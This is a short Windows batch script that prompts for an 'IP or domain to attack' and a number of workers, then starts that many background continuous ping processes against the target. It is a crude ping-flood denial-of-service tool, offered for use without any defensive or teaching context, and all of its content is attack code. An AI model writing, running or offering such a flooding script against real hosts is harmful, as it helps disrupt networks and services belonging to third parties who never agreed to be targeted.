@echo off

:: Get the target IP or domain from user.
set /p address=IP or domain to attack: 

:: Get number of parallel workers to run.
set /p workers=Number of workers to spin up: 

:: Start requested count of workers in the background.
echo Starting %workers% workers against %address%...
timeout 5 > NUL
FOR /L %%A IN (1,1,%workers%) DO (
    start /B cmd /k ping %address% -t > NUL
)
echo Done.
echo.
echo Close this window to stop all workers.